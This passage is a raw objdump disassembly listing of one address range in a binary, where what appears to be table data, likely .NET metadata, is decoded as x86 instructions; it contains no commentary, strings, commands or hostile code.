  406260:	00 00                	add    %al,(%eax)
  406262:	00 00                	add    %al,(%eax)
  406264:	c6 00 fd             	movb   $0xfd,(%eax)
  406267:	0b 37                	or     (%edi),%esi
  406269:	01 5d 00             	add    %ebx,0x0(%ebp)
  40626c:	5e                   	pop    %esi
  40626d:	41                   	inc    %ecx
  40626e:	00 00                	add    %al,(%eax)
  406270:	00 00                	add    %al,(%eax)
  406272:	c6 00 0c             	movb   $0xc,(%eax)
  406275:	0c 37                	or     $0x37,%al
  406277:	01 5e 00             	add    %ebx,0x0(%esi)
  40627a:	60                   	pusha
  40627b:	41                   	inc    %ecx
  40627c:	00 00                	add    %al,(%eax)
  40627e:	00 00                	add    %al,(%eax)
  406280:	c6 00 1b             	movb   $0x1b,(%eax)
  406283:	0c 35                	or     $0x35,%al
  406285:	00 5f 00             	add    %bl,0x0(%edi)
  406288:	62 41 00             	bound  %eax,0x0(%ecx)
  40628b:	00 00                	add    %al,(%eax)
  40628d:	00 c6                	add    %al,%dh
  40628f:	00 1b                	add    %bl,(%ebx)
  406291:	0c 5a                	or     $0x5a,%al
  406293:	02 5f 00             	add    0x0(%edi),%bl
  406296:	64 41                	fs inc %ecx
  406298:	00 00                	add    %al,(%eax)
  40629a:	00 00                	add    %al,(%eax)
  40629c:	c6 00 1b             	movb   $0x1b,(%eax)
  40629f:	0c 37                	or     $0x37,%al
  4062a1:	01 62 00             	add    %esp,0x0(%edx)
  4062a4:	68 41 00 00 00       	push   $0x41
  4062a9:	00 c6                	add    %al,%dh
  4062ab:	00 28                	add    %ch,(%eax)
  4062ad:	0c 67                	or     $0x67,%al
  4062af:	02 63 00             	add    0x0(%ebx),%ah
  4062b2:	cc                   	int3
  4062b3:	41                   	inc    %ecx
  4062b4:	00 00                	add    %al,(%eax)
  4062b6:	00 00                	add    %al,(%eax)
  4062b8:	c6 00 36             	movb   $0x36,(%eax)
  4062bb:	0c 37                	or     $0x37,%al
  4062bd:	01 65 00             	add    %esp,0x0(%ebp)
  4062c0:	ce                   	into
  4062c1:	41                   	inc    %ecx
  4062c2:	00 00                	add    %al,(%eax)
  4062c4:	00 00                	add    %al,(%eax)
  4062c6:	c6 00 47             	movb   $0x47,(%eax)
  4062c9:	0c 37                	or     $0x37,%al
  4062cb:	01 66 00             	add    %esp,0x0(%esi)
  4062ce:	d0 41 00             	rolb   $1,0x0(%ecx)
  4062d1:	00 00                	add    %al,(%eax)
  4062d3:	00 86 18 52 02 85    	add    %al,-0x7afdade8(%esi)
  4062d9:	02 67 00             	add    0x0(%edi),%ah
  4062dc:	1c 42                	sbb    $0x42,%al
  4062de:	00 00                	add    %al,(%eax)
  4062e0:	00 00                	add    %al,(%eax)
  4062e2:	c6                   	(bad)
  4062e3:	08 bd 0c 8d 02 69    	or     %bh,0x69028d0c(%ebp)
  4062e9:	00 56 42             	add    %dl,0x42(%esi)
  4062ec:	00 00                	add    %al,(%eax)
  4062ee:	00 00                	add    %al,(%eax)
  4062f0:	c6                   	(bad)
  4062f1:	08 e0                	or     %ah,%al
  4062f3:	0c 96                	or     $0x96,%al
  4062f5:	02 69 00             	add    0x0(%ecx),%ch
  4062f8:	5e                   	pop    %esi
  4062f9:	42                   	inc    %edx
  4062fa:	00 00                	add    %al,(%eax)
  4062fc:	00 00                	add    %al,(%eax)
  4062fe:	c6                   	(bad)
  4062ff:	08 f3                	or     %dh,%bl
  406301:	0c 96                	or     $0x96,%al
  406303:	02 69 00             	add    0x0(%ecx),%ch
  406306:	66 42                	inc    %dx
  406308:	00 00                	add    %al,(%eax)
  40630a:	00 00                	add    %al,(%eax)
  40630c:	c6                   	(bad)
  40630d:	08 08                	or     %cl,(%eax)
  40630f:	0d 9c 02 69 00       	or     $0x69029c,%eax
  406314:	6e                   	outsb  %ds:(%esi),(%dx)
  406315:	42                   	inc    %edx
  406316:	00 00                	add    %al,(%eax)
  406318:	00 00                	add    %al,(%eax)
  40631a:	c6                   	(bad)
  40631b:	08 17                	or     %dl,(%edi)
  40631d:	0d 33 01 69 00       	or     $0x690133,%eax
  406322:	75 42                	jne    0x406366
  406324:	00 00                	add    %al,(%eax)
  406326:	00 00                	add    %al,(%eax)
  406328:	c6                   	(bad)
  406329:	08 20                	or     %ah,(%eax)
  40632b:	0d a2 02 69 00       	or     $0x6902a2,%eax
  406330:	7d 42                	jge    0x406374
  406332:	00 00                	add    %al,(%eax)
  406334:	00 00                	add    %al,(%eax)
  406336:	c6                   	(bad)
  406337:	08 2f                	or     %ch,(%edi)
  406339:	0d a7 02 69 00       	or     $0x6902a7,%eax
  40633e:	89 42 00             	mov    %eax,0x0(%edx)
  406341:	00 00                	add    %al,(%eax)
  406343:	00 c6                	add    %al,%dh
  406345:	00 3b                	add    %bh,(%ebx)
  406347:	0d 35 00 69 00       	or     $0x690035,%eax
  40634c:	8b 42 00             	mov    0x0(%edx),%eax
  40634f:	00 00                	add    %al,(%eax)
  406351:	00 c6                	add    %al,%dh
  406353:	00 4d 0d             	add    %cl,0xd(%ebp)
  406356:	35 00 69 00 8d       	xor    $0x8d006900,%eax
  40635b:	42                   	inc    %edx
  40635c:	00 00                	add    %al,(%eax)
  40635e:	00 00                	add    %al,(%eax)
  406360:	c6 00 5e             	movb   $0x5e,(%eax)
  406363:	0d 35 00 69 00       	or     $0x690035,%eax
  406368:	8f 42 00             	pop    0x0(%edx)
  40636b:	00 00                	add    %al,(%eax)
  40636d:	00 c6                	add    %al,%dh
  40636f:	00 75 0d             	add    %dh,0xd(%ebp)
  406372:	35 00 69 00 91       	xor    $0x91006900,%eax
  406377:	42                   	inc    %edx
  406378:	00 00                	add    %al,(%eax)
  40637a:	00 00                	add    %al,(%eax)
  40637c:	c6 00 8a             	movb   $0x8a,(%eax)
  40637f:	0d f0 00 69 00       	or     $0x6900f0,%eax
  406384:	ab                   	stos   %eax,%es:(%edi)
  406385:	42                   	inc    %edx
  406386:	00 00                	add    %al,(%eax)
  406388:	00 00                	add    %al,(%eax)
  40638a:	86 18                	xchg   %bl,(%eax)
  40638c:	52                   	push   %edx
  40638d:	02 c9                	add    %cl,%cl
  40638f:	02 6a 00             	add    0x0(%edx),%ch
  406392:	c8 42 00 00          	enter  $0x42,$0x0
  406396:	00 00                	add    %al,(%eax)
  406398:	86 08                	xchg   %cl,(%eax)
  40639a:	db 0d cb 00 6b 00    	fisttpl 0x6b00cb
  4063a0:	d5 42                	aad    $0x42
  4063a2:	00 00                	add    %al,(%eax)
  4063a4:	00 00                	add    %al,(%eax)
  4063a6:	86 08                	xchg   %cl,(%eax)
  4063a8:	f4                   	hlt
  4063a9:	0d d0 00 6b 00       	or     $0x6b00d0,%eax
  4063ae:	e3 42                	jecxz  0x4063f2
  4063b0:	00 00                	add    %al,(%eax)
  4063b2:	00 00                	add    %al,(%eax)
  4063b4:	86 08                	xchg   %cl,(%eax)
  4063b6:	0d 0e cb 00 6c       	or     $0x6c00cb0e,%eax
  4063bb:	00 f0                	add    %dh,%al
  4063bd:	42                   	inc    %edx
  4063be:	00 00                	add    %al,(%eax)
  4063c0:	00 00                	add    %al,(%eax)
  4063c2:	86 08                	xchg   %cl,(%eax)
  4063c4:	26 0e                	es push %cs
  4063c6:	d0 00                	rolb   $1,(%eax)
  4063c8:	6c                   	insb   (%dx),%es:(%edi)
  4063c9:	00 fe                	add    %bh,%dh
  4063cb:	42                   	inc    %edx
  4063cc:	00 00                	add    %al,(%eax)
  4063ce:	00 00                	add    %al,(%eax)
  4063d0:	86 08                	xchg   %cl,(%eax)
  4063d2:	3f                   	aas
  4063d3:	0e                   	push   %cs
  4063d4:	cb                   	lret
  4063d5:	00 6d 00             	add    %ch,0x0(%ebp)
  4063d8:	0b 43 00             	or     0x0(%ebx),%eax
  4063db:	00 00                	add    %al,(%eax)
  4063dd:	00 86 08 5a 0e d0    	add    %al,-0x2ff1a5f8(%esi)
  4063e3:	00 6d 00             	add    %ch,0x0(%ebp)
  4063e6:	19 43 00             	sbb    %eax,0x0(%ebx)
  4063e9:	00 00                	add    %al,(%eax)
  4063eb:	00 86 08 75 0e cb    	add    %al,-0x34f18af8(%esi)
  4063f1:	00 6e 00             	add    %ch,0x0(%esi)
  4063f4:	26 43                	es inc %ebx
  4063f6:	00 00                	add    %al,(%eax)
  4063f8:	00 00                	add    %al,(%eax)
  4063fa:	86 08                	xchg   %cl,(%eax)
  4063fc:	90                   	nop
  4063fd:	0e                   	push   %cs
  4063fe:	d0 00                	rolb   $1,(%eax)
  406400:	6e                   	outsb  %ds:(%esi),(%dx)
  406401:	00 34 43             	add    %dh,(%ebx,%eax,2)
  406404:	00 00                	add    %al,(%eax)
  406406:	00 00                	add    %al,(%eax)
  406408:	86 08                	xchg   %cl,(%eax)
  40640a:	ab                   	stos   %eax,%es:(%edi)
  40640b:	0e                   	push   %cs
  40640c:	cb                   	lret
  40640d:	00 6f 00             	add    %ch,0x0(%edi)
  406410:	41                   	inc    %ecx
  406411:	43                   	inc    %ebx
  406412:	00 00                	add    %al,(%eax)
  406414:	00 00                	add    %al,(%eax)
  406416:	86 08                	xchg   %cl,(%eax)
  406418:	c4 0e                	les    (%esi),%ecx
  40641a:	d0 00                	rolb   $1,(%eax)
  40641c:	6f                   	outsl  %ds:(%esi),(%dx)
  40641d:	00 4f 43             	add    %cl,0x43(%edi)
  406420:	00 00                	add    %al,(%eax)
  406422:	00 00                	add    %al,(%eax)
  406424:	86 08                	xchg   %cl,(%eax)
  406426:	dd 0e                	fisttpll (%esi)
  406428:	cb                   	lret
  406429:	00 70 00             	add    %dh,0x0(%eax)
  40642c:	5c                   	pop    %esp
  40642d:	43                   	inc    %ebx
  40642e:	00 00                	add    %al,(%eax)
  406430:	00 00                	add    %al,(%eax)
  406432:	86 08                	xchg   %cl,(%eax)
  406434:	f6 0e d0             	testb  $0xd0,(%esi)
  406437:	00 70 00             	add    %dh,0x0(%eax)
  40643a:	6a 43                	push   $0x43
  40643c:	00 00                	add    %al,(%eax)
  40643e:	00 00                	add    %al,(%eax)
  406440:	86 08                	xchg   %cl,(%eax)
  406442:	0f                   	(bad)
  406443:	0f cb                	bswap  %ebx
  406445:	00 71 00             	add    %dh,0x0(%ecx)
  406448:	77 43                	ja     0x40648d
  40644a:	00 00                	add    %al,(%eax)
  40644c:	00 00                	add    %al,(%eax)
  40644e:	86 08                	xchg   %cl,(%eax)
  406450:	2a 0f                	sub    (%edi),%cl
  406452:	d0 00                	rolb   $1,(%eax)
  406454:	71 00                	jno    0x406456
  406456:	85 43 00             	test   %eax,0x0(%ebx)
  406459:	00 00                	add    %al,(%eax)
  40645b:	00 86 08 45 0f cb    	add    %al,-0x34f0baf8(%esi)
  406461:	00 72 00             	add    %dh,0x0(%edx)
  406464:	92                   	xchg   %eax,%edx
  406465:	43                   	inc    %ebx
  406466:	00 00                	add    %al,(%eax)
  406468:	00 00                	add    %al,(%eax)
  40646a:	86 08                	xchg   %cl,(%eax)
  40646c:	60                   	pusha
  40646d:	0f d0                	(bad)
  40646f:	00 72 00             	add    %dh,0x0(%edx)
  406472:	a0 43 00 00 00       	mov    0x43,%al
  406477:	00 86 08 7b 0f cb    	add    %al,-0x34f084f8(%esi)
  40647d:	00 73 00             	add    %dh,0x0(%ebx)
  406480:	ad                   	lods   %ds:(%esi),%eax
  406481:	43                   	inc    %ebx
  406482:	00 00                	add    %al,(%eax)
  406484:	00 00                	add    %al,(%eax)
  406486:	86 08                	xchg   %cl,(%eax)
  406488:	97                   	xchg   %eax,%edi
  406489:	0f d0                	(bad)
  40648b:	00 73 00             	add    %dh,0x0(%ebx)
  40648e:	bb 43 00 00 00       	mov    $0x43,%ebx
  406493:	00 86 08 b3 0f cb    	add    %al,-0x34f04cf8(%esi)
  406499:	00 74 00 c8          	add    %dh,-0x38(%eax,%eax,1)
  40649d:	43                   	inc    %ebx
  40649e:	00 00                	add    %al,(%eax)
  4064a0:	00 00                	add    %al,(%eax)
  4064a2:	86 08                	xchg   %cl,(%eax)
  4064a4:	cf                   	iret
  4064a5:	0f d0                	(bad)
  4064a7:	00 74 00 00          	add    %dh,0x0(%eax,%eax,1)
  4064ab:	00 00                	add    %al,(%eax)
  4064ad:	00 00                	add    %al,(%eax)
  4064af:	00 c6                	add    %al,%dh
  4064b1:	0d eb 0f 06 01       	or     $0x1060feb,%eax
  4064b6:	75 00                	jne    0x4064b8
  4064b8:	00 00                	add    %al,(%eax)
  4064ba:	00 00                	add    %al,(%eax)
  4064bc:	00 00                	add    %al,(%eax)
  4064be:	c6                   	(bad)
  4064bf:	0d fa 0f cf 02       	or     $0x2cf0ffa,%eax
  4064c4:	75 00                	jne    0x4064c6
  4064c6:	00 00                	add    %al,(%eax)
  4064c8:	00 00                	add    %al,(%eax)
  4064ca:	00 00                	add    %al,(%eax)
  4064cc:	c6                   	(bad)
  4064cd:	0d 09 10 ec 00       	or     $0xec1009,%eax
  4064d2:	76 00                	jbe    0x4064d4
  4064d4:	00 00                	add    %al,(%eax)
  4064d6:	00 00                	add    %al,(%eax)
  4064d8:	00 00                	add    %al,(%eax)
  4064da:	c6                   	(bad)
  4064db:	0d 16 10 f0 00       	or     $0xf01016,%eax
  4064e0:	76 00                	jbe    0x4064e2
  4064e2:	d6                   	salc
  4064e3:	43                   	inc    %ebx
  4064e4:	00 00                	add    %al,(%eax)
  4064e6:	00 00                	add    %al,(%eax)
  4064e8:	e6 09                	out    %al,$0x9
  4064ea:	eb 0f                	jmp    0x4064fb
  4064ec:	06                   	push   %es
  4064ed:	01 77 00             	add    %esi,0x0(%edi)
  4064f0:	de 43 00             	fiadds 0x0(%ebx)
  4064f3:	00 00                	add    %al,(%eax)
  4064f5:	00 e6                	add    %ah,%dh
  4064f7:	09 fa                	or     %edi,%edx
  4064f9:	0f cf                	bswap  %edi
  4064fb:	02 77 00             	add    0x0(%edi),%dh
  4064fe:	e7 43                	out    %eax,$0x43
  406500:	00 00                	add    %al,(%eax)
  406502:	00 00                	add    %al,(%eax)
  406504:	e6 09                	out    %al,$0x9
  406506:	09 10                	or     %edx,(%eax)
  406508:	ec                   	in     (%dx),%al
  406509:	00 78 00             	add    %bh,0x0(%eax)
  40650c:	ef                   	out    %eax,(%dx)
  40650d:	43                   	inc    %ebx
  40650e:	00 00                	add    %al,(%eax)
  406510:	00 00                	add    %al,(%eax)
  406512:	e6 09                	out    %al,$0x9
  406514:	16                   	push   %ss
  406515:	10 f0                	adc    %dh,%al
  406517:	00 78 00             	add    %bh,0x0(%eax)
  40651a:	64 44                	fs inc %esp
  40651c:	00 00                	add    %al,(%eax)
  40651e:	00 00                	add    %al,(%eax)
  406520:	91                   	xchg   %eax,%ecx
  406521:	00 4b 10             	add    %cl,0x10(%ebx)
  406524:	d4 02                	aam    $0x2
  406526:	79 00                	jns    0x406528
  406528:	ec                   	in     (%dx),%al
  406529:	49                   	dec    %ecx
  40652a:	00 00                	add    %al,(%eax)
  40652c:	00 00                	add    %al,(%eax)
  40652e:	91                   	xchg   %eax,%ecx
  40652f:	00 6c 10 da          	add    %ch,-0x26(%eax,%edx,1)
  406533:	02 7a 00             	add    0x0(%edx),%bh
  406536:	07                   	pop    %es
  406537:	4a                   	dec    %edx
  406538:	00 00                	add    %al,(%eax)
  40653a:	00 00                	add    %al,(%eax)
  40653c:	86 18                	xchg   %bl,(%eax)
  40653e:	52                   	push   %edx
  40653f:	02 35 00 7c 00 f8    	add    0xf8007c00,%dh
  406545:	43                   	inc    %ebx
  406546:	00 00                	add    %al,(%eax)
  406548:	00 00                	add    %al,(%eax)
  40654a:	86 18                	xchg   %bl,(%eax)
  40654c:	52                   	push   %edx
  40654d:	02 35 00 7c 00 00    	add    0x7c00,%dh
  406553:	44                   	inc    %esp
  406554:	00 00                	add    %al,(%eax)
  406556:	00 00                	add    %al,(%eax)
  406558:	86 00                	xchg   %al,(%eax)
  40655a:	51                   	push   %ecx
  40655b:	1e                   	push   %ds
  40655c:	86 06                	xchg   %al,(%esi)
  40655e:	7c 00                	jl     0x406560
  406560:	28 44 00 00          	sub    %al,0x0(%eax,%eax,1)
  406564:	00 00                	add    %al,(%eax)
  406566:	86 00                	xchg   %al,(%eax)
  406568:	5c                   	pop    %esp
  406569:	1e                   	push   %ds
  40656a:	86 06                	xchg   %al,(%esi)
  40656c:	7e 00                	jle    0x40656e
  40656e:	4b                   	dec    %ebx
  40656f:	44                   	inc    %esp
  406570:	00 00                	add    %al,(%eax)
  406572:	00 00                	add    %al,(%eax)
  406574:	86 00                	xchg   %al,(%eax)
  406576:	74 1e                	je     0x406596
  406578:	8e 06                	mov    (%esi),%es
  40657a:	80 00 00             	addb   $0x0,(%eax)
  40657d:	00 01                	add    %al,(%ecx)
  40657f:	00 8d 10 00 00 02    	add    %cl,0x2000010(%ebp)
  406585:	00 96 10 00 00 03    	add    %dl,0x3000010(%esi)
  40658b:	00 a1 10 00 00 04    	add    %ah,0x4000010(%ecx)
  406591:	00 ab 10 00 00 05    	add    %ch,0x5000010(%ebx)
  406597:	00 b2 10 00 00 06    	add    %dh,0x6000010(%edx)
  40659d:	00 bb 10 00 00 07    	add    %bh,0x7000010(%ebx)
  4065a3:	00 c7                	add    %al,%bh
  4065a5:	10 00                	adc    %al,(%eax)
  4065a7:	00 08                	add    %cl,(%eax)
  4065a9:	00 d0                	add    %dl,%al
  4065ab:	10 00                	adc    %al,(%eax)
  4065ad:	20 09                	and    %cl,(%ecx)
  4065af:	00 dc                	add    %bl,%ah
  4065b1:	10 00                	adc    %al,(%eax)
  4065b3:	00 0a                	add    %cl,(%edx)
  4065b5:	00 23                	add    %ah,(%ebx)
  4065b7:	11 00                	adc    %eax,(%eax)
  4065b9:	00 01                	add    %al,(%ecx)
  4065bb:	00 29                	add    %ch,(%ecx)
  4065bd:	11 00                	adc    %eax,(%eax)
  4065bf:	00 02                	add    %al,(%edx)
  4065c1:	00 31                	add    %dh,(%ecx)
  4065c3:	11 00                	adc    %eax,(%eax)
  4065c5:	00 03                	add    %al,(%ebx)
  4065c7:	00 39                	add    %bh,(%ecx)
  4065c9:	11 00                	adc    %eax,(%eax)
  4065cb:	00 04 00             	add    %al,(%eax,%eax,1)
  4065ce:	40                   	inc    %eax
  4065cf:	11 00                	adc    %eax,(%eax)
  4065d1:	00 05 00 45 11 00    	add    %al,0x114500
  4065d7:	00 06                	add    %al,(%esi)
  4065d9:	00 4f 11             	add    %cl,0x11(%edi)
  4065dc:	00 00                	add    %al,(%eax)
  4065de:	01 00                	add    %eax,(%eax)
  4065e0:	57                   	push   %edi
  4065e1:	11 00                	adc    %eax,(%eax)
  4065e3:	00 01                	add    %al,(%ecx)
  4065e5:	00 57 11             	add    %dl,0x11(%edi)
  4065e8:	00 00                	add    %al,(%eax)
  4065ea:	01 00                	add    %eax,(%eax)
  4065ec:	57                   	push   %edi
  4065ed:	11 00                	adc    %eax,(%eax)
  4065ef:	00 01                	add    %al,(%ecx)
  4065f1:	00 57 11             	add    %dl,0x11(%edi)
  4065f4:	00 00                	add    %al,(%eax)
  4065f6:	01 00                	add    %eax,(%eax)
  4065f8:	57                   	push   %edi
  4065f9:	11 00                	adc    %eax,(%eax)
  4065fb:	00 01                	add    %al,(%ecx)
  4065fd:	00 5d 11             	add    %bl,0x11(%ebp)
  406600:	00 00                	add    %al,(%eax)
  406602:	01 00                	add    %eax,(%eax)
  406604:	4f                   	dec    %edi
  406605:	11 00                	adc    %eax,(%eax)
  406607:	00 01                	add    %al,(%ecx)
  406609:	00 67 11             	add    %ah,0x11(%edi)
  40660c:	00 00                	add    %al,(%eax)
  40660e:	02 00                	add    (%eax),%al
  406610:	6e                   	outsb  %ds:(%esi),(%dx)
  406611:	11 00                	adc    %eax,(%eax)
  406613:	00 03                	add    %al,(%ebx)
  406615:	00 7a 11             	add    %bh,0x11(%edx)
  406618:	00 00                	add    %al,(%eax)
  40661a:	04 00                	add    $0x0,%al
  40661c:	7f 11                	jg     0x40662f
  40661e:	00 00                	add    %al,(%eax)
  406620:	01 00                	add    %eax,(%eax)
  406622:	5d                   	pop    %ebp
  406623:	11 00                	adc    %eax,(%eax)
  406625:	00 02                	add    %al,(%edx)
  406627:	00 7f 11             	add    %bh,0x11(%edi)
  40662a:	00 00                	add    %al,(%eax)
  40662c:	01 00                	add    %eax,(%eax)
  40662e:	84 11                	test   %dl,(%ecx)
  406630:	00 00                	add    %al,(%eax)
  406632:	02 00                	add    (%eax),%al
  406634:	8b 11                	mov    (%ecx),%edx
  406636:	00 00                	add    %al,(%eax)
  406638:	01 00                	add    %eax,(%eax)
  40663a:	57                   	push   %edi
  40663b:	11 00                	adc    %eax,(%eax)
  40663d:	00 01                	add    %al,(%ecx)
  40663f:	00 57 11             	add    %dl,0x11(%edi)
  406642:	00 00                	add    %al,(%eax)
  406644:	01 00                	add    %eax,(%eax)
  406646:	57                   	push   %edi
  406647:	11 00                	adc    %eax,(%eax)
  406649:	00 01                	add    %al,(%ecx)
  40664b:	00 94 11 00 00 01 00 	add    %dl,0x10000(%ecx,%edx,1)
  406652:	9a 11 00 00 02 00 a3 	lcall  $0xa300,$0x2000011
  406659:	11 00                	adc    %eax,(%eax)
  40665b:	00 03                	add    %al,(%ebx)
  40665d:	00 ad 11 00 00 04    	add    %ch,0x4000011(%ebp)
  406663:	00 b4 11 00 00 01 00 	add    %dh,0x10000(%ecx,%edx,1)
  40666a:	9a 11 00 00 02 00 a3 	lcall  $0xa300,$0x2000011
  406671:	11 00                	adc    %eax,(%eax)
  406673:	00 03                	add    %al,(%ebx)
  406675:	00 ad 11 00 00 01    	add    %ch,0x1000011(%ebp)
  40667b:	00 bd 11 00 00 02    	add    %bh,0x2000011(%ebp)
  406681:	00 c7                	add    %al,%bh
  406683:	11 00                	adc    %eax,(%eax)
  406685:	00 03                	add    %al,(%ebx)
  406687:	00 9a 11 00 00 04    	add    %bl,0x4000011(%edx)
  40668d:	00 a3 11 00 00 01    	add    %ah,0x1000011(%ebx)
  406693:	00 d2                	add    %dl,%dl
  406695:	11 00                	adc    %eax,(%eax)
  406697:	00 02                	add    %al,(%edx)
  406699:	00 db                	add    %bl,%bl
  40669b:	11 00                	adc    %eax,(%eax)
  40669d:	00 03                	add    %al,(%ebx)
  40669f:	00 e5                	add    %ah,%ch
  4066a1:	11 02                	adc    %eax,(%edx)
  4066a3:	20 04 00             	and    %al,(%eax,%eax,1)
  4066a6:	f0 11 00             	lock adc %eax,(%eax)
  4066a9:	00 05 00 06 12 00    	add    %al,0x120600
  4066af:	00 06                	add    %al,(%esi)
  4066b1:	00 0e                	add    %cl,(%esi)
  4066b3:	12 00                	adc    (%eax),%al
  4066b5:	00 01                	add    %al,(%ecx)
  4066b7:	00 15 12 00 00 02    	add    %dl,0x2000012
  4066bd:	00 1a                	add    %bl,(%edx)
  4066bf:	12 00                	adc    (%eax),%al
  4066c1:	00 03                	add    %al,(%ebx)
  4066c3:	00 22                	add    %ah,(%edx)
  4066c5:	12 00                	adc    (%eax),%al
  4066c7:	00 01                	add    %al,(%ecx)
  4066c9:	00 9a 11 00 00 02    	add    %bl,0x2000011(%edx)
  4066cf:	00 a3 11 00 00 03    	add    %ah,0x3000011(%ebx)
  4066d5:	00 2a                	add    %ch,(%edx)
  4066d7:	12 00                	adc    (%eax),%al
  4066d9:	00 01                	add    %al,(%ecx)
  4066db:	00 3b                	add    %bh,(%ebx)
  4066dd:	12 00                	adc    (%eax),%al
  4066df:	00 02                	add    %al,(%edx)
  4066e1:	00 42 12             	add    %al,0x12(%edx)
  4066e4:	00 00                	add    %al,(%eax)
  4066e6:	01 00                	add    %eax,(%eax)
  4066e8:	3b 12                	cmp    (%edx),%edx
  4066ea:	00 00                	add    %al,(%eax)
  4066ec:	02 00                	add    (%eax),%al
  4066ee:	42                   	inc    %edx
  4066ef:	12 00                	adc    (%eax),%al
  4066f1:	00 01                	add    %al,(%ecx)
  4066f3:	00 44 12 00          	add    %al,0x0(%edx,%edx,1)
  4066f7:	00 01                	add    %al,(%ecx)
  4066f9:	00 67 11             	add    %ah,0x11(%edi)
  4066fc:	00 00                	add    %al,(%eax)
  4066fe:	02 00                	add    (%eax),%al
  406700:	42                   	inc    %edx
  406701:	12 00                	adc    (%eax),%al
  406703:	00 01                	add    %al,(%ecx)
  406705:	00 4a 12             	add    %cl,0x12(%edx)
  406708:	00 00                	add    %al,(%eax)
  40670a:	02 00                	add    (%eax),%al
  40670c:	4d                   	dec    %ebp
  40670d:	12 00                	adc    (%eax),%al
  40670f:	00 01                	add    %al,(%ecx)
  406711:	00 56 12             	add    %dl,0x12(%esi)
  406714:	00 00                	add    %al,(%eax)
  406716:	01 00                	add    %eax,(%eax)
  406718:	5f                   	pop    %edi
  406719:	12 00                	adc    (%eax),%al
  40671b:	00 01                	add    %al,(%ecx)
  40671d:	00 69 12             	add    %ch,0x12(%ecx)
  406720:	00 00                	add    %al,(%eax)
  406722:	01 00                	add    %eax,(%eax)
  406724:	73 12                	jae    0x406738
  406726:	00 00                	add    %al,(%eax)
  406728:	01 00                	add    %eax,(%eax)
  40672a:	29 11                	sub    %edx,(%ecx)
  40672c:	00 00                	add    %al,(%eax)
  40672e:	02 00                	add    (%eax),%al
  406730:	31 11                	xor    %edx,(%ecx)
  406732:	00 00                	add    %al,(%eax)
  406734:	03 00                	add    (%eax),%eax
  406736:	79 12                	jns    0x40674a
  406738:	00 00                	add    %al,(%eax)
  40673a:	01 00                	add    %eax,(%eax)
  40673c:	29 11                	sub    %edx,(%ecx)
  40673e:	00 00                	add    %al,(%eax)
  406740:	02 00                	add    (%eax),%al
  406742:	31 11                	xor    %edx,(%ecx)
  406744:	00 00                	add    %al,(%eax)
  406746:	03 00                	add    (%eax),%eax
  406748:	86 12                	xchg   %dl,(%edx)
  40674a:	00 00                	add    %al,(%eax)
  40674c:	04 00                	add    $0x0,%al
  40674e:	8e 12                	mov    (%edx),%ss
  406750:	00 00                	add    %al,(%eax)
  406752:	01 00                	add    %eax,(%eax)
  406754:	29 11                	sub    %edx,(%ecx)
  406756:	00 00                	add    %al,(%eax)
  406758:	02 00                	add    (%eax),%al
  40675a:	31 11                	xor    %edx,(%ecx)
  40675c:	00 00                	add    %al,(%eax)
  40675e:	03 00                	add    (%eax),%eax
  406760:	b2 10                	mov    $0x10,%dl
  406762:	00 00                	add    %al,(%eax)
  406764:	04 00                	add    $0x0,%al
  406766:	96                   	xchg   %eax,%esi
  406767:	10 00                	adc    %al,(%eax)
  406769:	00 05 00 9c 12 00    	add    %al,0x129c00
  40676f:	00 06                	add    %al,(%esi)
  406771:	00 4f 11             	add    %cl,0x11(%edi)
  406774:	00 00                	add    %al,(%eax)
  406776:	01 00                	add    %eax,(%eax)
  406778:	29 11                	sub    %edx,(%ecx)
  40677a:	00 00                	add    %al,(%eax)
  40677c:	02 00                	add    (%eax),%al
  40677e:	31 11                	xor    %edx,(%ecx)
  406780:	00 00                	add    %al,(%eax)
  406782:	03 00                	add    (%eax),%eax
  406784:	b2 10                	mov    $0x10,%dl
  406786:	00 00                	add    %al,(%eax)
  406788:	04 00                	add    $0x0,%al
  40678a:	96                   	xchg   %eax,%esi
  40678b:	10 00                	adc    %al,(%eax)
  40678d:	00 01                	add    %al,(%ecx)
  40678f:	00 b3 12 00 00 02    	add    %dh,0x2000012(%ebx)
  406795:	00 c3                	add    %al,%bl
  406797:	12 00                	adc    (%eax),%al
  406799:	00 03                	add    %al,(%ebx)
  40679b:	00 57 11             	add    %dl,0x11(%edi)
  40679e:	00 00                	add    %al,(%eax)
  4067a0:	01 00                	add    %eax,(%eax)
  4067a2:	57                   	push   %edi
  4067a3:	11 00                	adc    %eax,(%eax)
  4067a5:	00 01                	add    %al,(%ecx)
  4067a7:	00 31                	add    %dh,(%ecx)
  4067a9:	11 00                	adc    %eax,(%eax)
  4067ab:	00 01                	add    %al,(%ecx)
  4067ad:	00 57 11             	add    %dl,0x11(%edi)
  4067b0:	00 00                	add    %al,(%eax)
  4067b2:	01 00                	add    %eax,(%eax)
  4067b4:	b3 12                	mov    $0x12,%bl
  4067b6:	00 00                	add    %al,(%eax)
  4067b8:	02 00                	add    (%eax),%al
  4067ba:	c3                   	ret
  4067bb:	12 00                	adc    (%eax),%al
  4067bd:	00 03                	add    %al,(%ebx)
  4067bf:	00 57 11             	add    %dl,0x11(%edi)
  4067c2:	00 00                	add    %al,(%eax)
  4067c4:	01 00                	add    %eax,(%eax)
  4067c6:	57                   	push   %edi
  4067c7:	11 00                	adc    %eax,(%eax)
  4067c9:	00 01                	add    %al,(%ecx)
  4067cb:	00 d3                	add    %dl,%bl
  4067cd:	12 00                	adc    (%eax),%al
  4067cf:	00 02                	add    %al,(%edx)
  4067d1:	00 dc                	add    %bl,%ah
  4067d3:	12 00                	adc    (%eax),%al
  4067d5:	00 01                	add    %al,(%ecx)
  4067d7:	00 31                	add    %dh,(%ecx)
  4067d9:	11 00                	adc    %eax,(%eax)
  4067db:	00 01                	add    %al,(%ecx)
  4067dd:	00 31                	add    %dh,(%ecx)
  4067df:	11 00                	adc    %eax,(%eax)
  4067e1:	00 01                	add    %al,(%ecx)
  4067e3:	00 e3                	add    %ah,%bl
  4067e5:	12 00                	adc    (%eax),%al
  4067e7:	00 02                	add    %al,(%edx)
  4067e9:	00 65 0c             	add    %ah,0xc(%ebp)
  4067ec:	00 00                	add    %al,(%eax)
  4067ee:	01 00                	add    %eax,(%eax)
  4067f0:	42                   	inc    %edx
  4067f1:	10 00                	adc    %al,(%eax)
  4067f3:	00 01                	add    %al,(%ecx)
  4067f5:	00 65 0c             	add    %ah,0xc(%ebp)
  4067f8:	00 00                	add    %al,(%eax)
  4067fa:	01 00                	add    %eax,(%eax)
  4067fc:	57                   	push   %edi
  4067fd:	11 00                	adc    %eax,(%eax)
